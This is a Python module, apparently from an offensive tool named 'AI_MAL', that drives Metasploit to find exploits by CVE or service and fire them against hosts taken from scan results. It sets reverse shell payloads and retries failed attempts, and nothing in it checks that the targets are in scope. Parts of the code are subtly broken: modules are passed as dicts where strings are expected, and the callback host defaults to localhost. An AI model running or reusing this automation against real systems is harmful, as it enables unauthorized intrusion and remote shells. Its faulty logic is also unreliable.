#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AI_MAL Metasploit Framework Integration Module
============================================

This module handles integration with the Metasploit Framework for exploit execution.
"""

import os
import re
import json
import time
import subprocess
import socket
import tempfile
from .logger import LoggerWrapper

class MetasploitFramework:
    """
    MetasploitFramework class for integrating with and controlling Metasploit.
    """
    
    def __init__(self, host="127.0.0.1", port=55552, user="msf", password=None, 
                 timeout=60, use_msfrpc=True, persistence_retries=3):
        """
        Initialize the Metasploit Framework integration.
        
        Args:
            host (str): Metasploit RPC host
            port (int): Metasploit RPC port
            user (str): Metasploit RPC username
            password (str, optional): Metasploit RPC password
            timeout (int): Command timeout in seconds
            use_msfrpc (bool): Whether to use MSFRPC or execute via shell
            persistence_retries (int): Number of retry attempts for failed exploits
        """
        self.host = host
        self.port = port
        self.user = user
        self.password = password
        self.timeout = timeout
        self.use_msfrpc = use_msfrpc
        self.persistence_retries = persistence_retries
        self.logger = LoggerWrapper("MSF")
        
        # Initialize msfrpc client if requested
        self.client = None
        self.token = None
        if self.use_msfrpc:
            try:
                import pymetasploit3
                self.msfrpc_available = True
            except ImportError:
                self.logger.warning("pymetasploit3 not installed. Falling back to command-line interface.")
                self.msfrpc_available = False
                self.use_msfrpc = False
        else:
            self.msfrpc_available = False
    
    def is_msf_available(self):
        """
        Check if Metasploit is available.
        
        Returns:
            bool: True if Metasploit is available, False otherwise
        """
        try:
            # Try command-line interface
            subprocess.run(["msfconsole", "-h"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except FileNotFoundError:
            return False
    
    def connect_msfrpc(self):
        """
        Connect to the Metasploit RPC server.
        
        Returns:
            bool: True if connection successful, False otherwise
        """
        if not self.msfrpc_available:
            return False
        
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            
            # Generate a password if one isn't provided
            if not self.password:
                import string
                import random
                chars = string.ascii_letters + string.digits
                self.password = ''.join(random.choice(chars) for _ in range(16))
                
                # Start msfrpcd if not running
                try:
                    # Check if msfrpcd is running
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    result = s.connect_ex((self.host, self.port))
                    s.close()
                    
                    if result != 0:  # Port is not open
                        self.logger.info(f"Starting msfrpcd on {self.host}:{self.port}")
                        subprocess.Popen(
                            ["msfrpcd", "-P", self.password, "-U", self.user, "-a", self.host, "-p", str(self.port)],
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE
                        )
                        # Wait for msfrpcd to start
                        time.sleep(5)
                except Exception as e:
                    self.logger.warning(f"Failed to start msfrpcd: {str(e)}")
            
            # Connect to msfrpcd
            self.logger.debug(f"Connecting to msfrpcd at {self.host}:{self.port}")
            self.client = MsfRpcClient(self.password, server=self.host, port=self.port, username=self.user, ssl=False)
            
            # Test connection by retrieving version
            version = self.client.core.version
            self.logger.info(f"Connected to Metasploit Framework {version['version']}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to connect to msfrpcd: {str(e)}")
            return False
    
    def find_exploits_for_cve(self, cve_id):
        """
        Find Metasploit exploits for a given CVE ID.
        
        Args:
            cve_id (str): The CVE ID to search for
        
        Returns:
            list: List of exploit modules for the CVE
        """
        if self.use_msfrpc and self.client:
            # Use msfrpc to search for exploits
            search_results = self.client.modules.search(f"cve:{cve_id}")
            exploits = [r for r in search_results if r['type'] == 'exploit']
            return exploits
        else:
            # Use command-line interface
            try:
                # Create a temporary file for the output
                with tempfile.NamedTemporaryFile(mode='w+', delete=False) as temp:
                    temp_file = temp.name
                
                cmd = [
                    "msfconsole", "-q", "-x", 
                    f"search cve:{cve_id}; exit -y", 
                    "-o", temp_file
                ]
                
                subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Parse the output to find exploits
                exploits = []
                with open(temp_file, 'r') as f:
                    output = f.read()
                    
                    # Extract exploit modules using regex
                    pattern = r'\s+(\d+)\s+exploit/([^\s]+)\s+([^\n]+)'
                    matches = re.findall(pattern, output)
                    
                    for match in matches:
                        module_id, module_path, description = match
                        exploits.append({
                            'type': 'exploit',
                            'name': f"exploit/{module_path}",
                            'description': description.strip()
                        })
                
                # Clean up the temporary file
                os.unlink(temp_file)
                
                return exploits
                
            except Exception as e:
                self.logger.error(f"Error searching for exploits: {str(e)}")
                return []
    
    def find_exploits_for_service(self, service_name, version=None):
        """
        Find Metasploit exploits for a given service.
        
        Args:
            service_name (str): The service name to search for
            version (str, optional): Service version for more specific results
        
        Returns:
            list: List of exploit modules for the service
        """
        search_term = service_name
        if version:
            search_term = f"{service_name} {version}"
        
        if self.use_msfrpc and self.client:
            # Use msfrpc to search for exploits
            search_results = self.client.modules.search(f"name:{search_term}")
            exploits = [r for r in search_results if r['type'] == 'exploit']
            return exploits
        else:
            # Use command-line interface
            try:
                # Create a temporary file for the output
                with tempfile.NamedTemporaryFile(mode='w+', delete=False) as temp:
                    temp_file = temp.name
                
                cmd = [
                    "msfconsole", "-q", "-x", 
                    f"search name:{search_term}; exit -y", 
                    "-o", temp_file
                ]
                
                subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Parse the output to find exploits
                exploits = []
                with open(temp_file, 'r') as f:
                    output = f.read()
                    
                    # Extract exploit modules using regex
                    pattern = r'\s+(\d+)\s+exploit/([^\s]+)\s+([^\n]+)'
                    matches = re.findall(pattern, output)
                    
                    for match in matches:
                        module_id, module_path, description = match
                        exploits.append({
                            'type': 'exploit',
                            'name': f"exploit/{module_path}",
                            'description': description.strip()
                        })
                
                # Clean up the temporary file
                os.unlink(temp_file)
                
                return exploits
                
            except Exception as e:
                self.logger.error(f"Error searching for exploits: {str(e)}")
                return []
    
    def run_exploit_msfrpc(self, exploit_module, target_host, target_port, options=None):
        """
        Run a Metasploit exploit using msfrpc.
        
        Args:
            exploit_module (str): The exploit module to use
            target_host (str): The target host
            target_port (int): The target port
            options (dict, optional): Additional exploit options
        
        Returns:
            dict: Exploit results
        """
        if not self.client:
            if not self.connect_msfrpc():
                return {"status": "error", "message": "Failed to connect to msfrpcd"}
        
        try:
            # Create an exploit instance
            exploit = self.client.modules.use('exploit', exploit_module.replace('exploit/', ''))
            
            # Set required options
            exploit['RHOSTS'] = target_host
            exploit['RPORT'] = target_port
            
            # Set payload (generic reverse shell)
            payload_name = self.client.modules.compatible_payloads(exploit_module.replace('exploit/', ''))['payloads'][0]
            payload = self.client.modules.use('payload', payload_name)
            
            # Set payload options
            payload['LHOST'] = self.host
            
            # Set additional options if provided
            if options:
                for key, value in options.items():
                    if key.startswith('PAYLOAD_'):
                        # This is a payload option
                        payload_key = key.replace('PAYLOAD_', '')
                        payload[payload_key] = value
                    else:
                        # This is an exploit option
                        exploit[key] = value
            
            # Execute the exploit
            self.logger.info(f"Running exploit {exploit_module} against {target_host}:{target_port}")
            result = exploit.execute(payload=payload)
            
            # Parse the result
            if result.get('job_id'):
                # Exploit running as a job
                job_id = result['job_id']
                self.logger.info(f"Exploit running as job {job_id}")
                
                # Wait for a session
                for _ in range(10):  # Wait up to 10 seconds for a session
                    sessions = self.client.sessions.list
                    if sessions:
                        session_id = list(sessions.keys())[0]
                        self.logger.info(f"Session {session_id} opened")
                        return {
                            "status": "success",
                            "message": f"Exploitation successful. Session {session_id} opened.",
                            "session_id": session_id,
                            "target": f"{target_host}:{target_port}",
                            "exploit": exploit_module
                        }
                    time.sleep(1)
                
                return {
                    "status": "unknown",
                    "message": f"Exploit running as job {job_id}, but no session established yet.",
                    "job_id": job_id,
                    "target": f"{target_host}:{target_port}",
                    "exploit": exploit_module
                }
            else:
                # Direct execution result
                return {
                    "status": "failure",
                    "message": "Exploitation failed. No job or session created.",
                    "target": f"{target_host}:{target_port}",
                    "exploit": exploit_module
                }
                
        except Exception as e:
            self.logger.error(f"Error running exploit {exploit_module}: {str(e)}")
            return {
                "status": "error",
                "message": f"Error running exploit: {str(e)}",
                "target": f"{target_host}:{target_port}",
                "exploit": exploit_module
            }
    
    def run_exploit_console(self, exploit_module, target_host, target_port, options=None):
        """
        Run a Metasploit exploit using the command-line console.
        
        Args:
            exploit_module (str): The exploit module to use
            target_host (str): The target host
            target_port (int): The target port
            options (dict, optional): Additional exploit options
        
        Returns:
            dict: Exploit results
        """
        try:
            # Create a temporary file for the resource script
            with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.rc') as rc_file:
                # Write use exploit command
                rc_file.write(f"use {exploit_module}\n")
                
                # Set target options
                rc_file.write(f"set RHOSTS {target_host}\n")
                rc_file.write(f"set RPORT {target_port}\n")
                
                # Set payload (using generic reverse shell)
                rc_file.write("set PAYLOAD generic/shell_reverse_tcp\n")
                rc_file.write(f"set LHOST {self.host}\n")
                
                # Set additional options if provided
                if options:
                    for key, value in options.items():
                        if not key.startswith('PAYLOAD_'):
                            rc_file.write(f"set {key} {value}\n")
                
                # Set exploit command
                rc_file.write("exploit -z\n")
                
                # Set exit command
                rc_file.write("exit -y\n")
                
                rc_file_path = rc_file.name
            
            # Create a temporary file for the output
            with tempfile.NamedTemporaryFile(mode='w+', delete=False) as output_file:
                output_file_path = output_file.name
            
            # Run msfconsole with the resource script
            self.logger.info(f"Running exploit {exploit_module} against {target_host}:{target_port}")
            cmd = ["msfconsole", "-q", "-r", rc_file_path, "-o", output_file_path]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            try:
                stdout, stderr = process.communicate(timeout=self.timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                self.logger.warning(f"Exploit {exploit_module} timed out")
            
            # Read the output file
            with open(output_file_path, 'r') as f:
                output = f.read()
            
            # Clean up temporary files
            os.unlink(rc_file_path)
            os.unlink(output_file_path)
            
            # Check for success indicators in the output
            if "Command shell session" in output or "Meterpreter session" in output:
                return {
                    "status": "success",
                    "message": "Exploitation successful. Session opened.",
                    "target": f"{target_host}:{target_port}",
                    "exploit": exploit_module,
                    "output": output
                }
            elif "Exploit completed, but no session was created" in output:
                return {
                    "status": "failure",
                    "message": "Exploit completed, but no session was created.",
                    "target": f"{target_host}:{target_port}",
                    "exploit": exploit_module,
                    "output": output
                }
            else:
                return {
                    "status": "unknown",
                    "message": "Exploit ran with unknown result.",
                    "target": f"{target_host}:{target_port}",
                    "exploit": exploit_module,
                    "output": output
                }
                
        except Exception as e:
            self.logger.error(f"Error running exploit {exploit_module}: {str(e)}")
            return {
                "status": "error",
                "message": f"Error running exploit: {str(e)}",
                "target": f"{target_host}:{target_port}",
                "exploit": exploit_module
            }
    
    def run_exploit(self, exploit_module, target_host, target_port, options=None):
        """
        Run a Metasploit exploit.
        
        Args:
            exploit_module (str): The exploit module to use
            target_host (str): The target host
            target_port (int): The target port
            options (dict, optional): Additional exploit options
        
        Returns:
            dict: Exploit results
        """
        if not self.is_msf_available():
            self.logger.error("Metasploit Framework is not available. Please install it.")
            return {"status": "error", "message": "Metasploit Framework is not available"}
        
        # Try multiple times if requested for persistence
        for attempt in range(self.persistence_retries):
            if attempt > 0:
                self.logger.info(f"Retry attempt {attempt+1}/{self.persistence_retries} for exploit {exploit_module}")
            
            # Run the exploit using the appropriate method
            if self.use_msfrpc:
                result = self.run_exploit_msfrpc(exploit_module, target_host, target_port, options)
            else:
                result = self.run_exploit_console(exploit_module, target_host, target_port, options)
            
            # If successful or error, return the result
            if result["status"] in ["success", "error"]:
                return result
            
            # If unsuccessful but we have more retries, wait and try again
            if attempt < self.persistence_retries - 1:
                time.sleep(2)  # Wait before retrying
        
        # Return the last result if we've exhausted all retries
        return result
    
    def run_exploits(self, scan_results):
        """
        Run appropriate exploits based on scan results.
        
        Args:
            scan_results (dict): Scan results containing vulnerabilities
        
        Returns:
            list: Exploit results
        """
        exploit_results = []
        
        # Check if scan results contain vulnerabilities
        if not isinstance(scan_results, dict):
            self.logger.error("Invalid scan results format. Expected dictionary.")
            return exploit_results
            
        if "vulnerabilities" not in scan_results:
            self.logger.warning("No vulnerabilities found in scan results. Skipping exploitation.")
            return exploit_results
        
        # Extract unique targets and their vulnerabilities
        targets = {}
        for vuln in scan_results["vulnerabilities"]:
            if not isinstance(vuln, dict):
                self.logger.warning(f"Skipping invalid vulnerability entry: {vuln}")
                continue
                
            # Skip if no host or port information
            if not vuln.get("host") or not vuln.get("port"):
                self.logger.warning(f"Skipping vulnerability with missing host/port: {vuln}")
                continue
            
            host = vuln["host"]
            port_info = vuln["port"]
            
            # Extract port number from port info (format: "80/tcp")
            try:
                port = port_info.split("/")[0] if "/" in port_info else port_info
                port = int(port)
            except (ValueError, AttributeError) as e:
                self.logger.warning(f"Invalid port format: {port_info}")
                continue
            
            # Create target key
            target_key = f"{host}:{port}"
            
            # Add vulnerability to target
            if target_key not in targets:
                targets[target_key] = []
            
            targets[target_key].append(vuln)
        
        # Attempt to exploit each target
        for target_key, vulns in targets.items():
            try:
                host, port = target_key.split(":")
                port = int(port)
                
                # Try to find exploits for each vulnerability
                for vuln in vulns:
                    # Check if the vulnerability has a CVE
                    cve_ids = []
                    if vuln.get("cve") and vuln["cve"] != "N/A":
                        # Split CVEs if multiple are present
                        if "," in vuln["cve"]:
                            cve_ids = [cve.strip() for cve in vuln["cve"].split(",")]
                        else:
                            cve_ids = [vuln["cve"].strip()]
                    
                    # Find exploits for each CVE
                    exploits = []
                    for cve_id in cve_ids:
                        cve_exploits = self.find_exploits_for_cve(cve_id)
                        if cve_exploits:
                            exploits.extend(cve_exploits)
                    
                    # If no exploits found via CVEs, try to find exploits for the service
                    if not exploits and "hosts" in scan_results:
                        for host_data in scan_results["hosts"]:
                            if not isinstance(host_data, dict) or "ports" not in host_data:
                                continue
                                
                            for port_data in host_data["ports"]:
                                if not isinstance(port_data, dict):
                                    continue
                                    
                                if int(port_data.get("portid", 0)) == port and port_data.get("service", {}).get("name"):
                                    service_name = port_data["service"]["name"]
                                    service_version = port_data["service"].get("version", "")
                                    service_exploits = self.find_exploits_for_service(service_name, service_version)
                                    if service_exploits:
                                        exploits.extend(service_exploits)
                    
                    # Run exploits if found
                    if exploits:
                        for exploit in exploits:
                            result = self.run_exploit(exploit, host, port)
                            if result:
                                exploit_results.append(result)
            except Exception as e:
                self.logger.error(f"Error processing target {target_key}: {str(e)}")
                continue
        
        return exploit_results 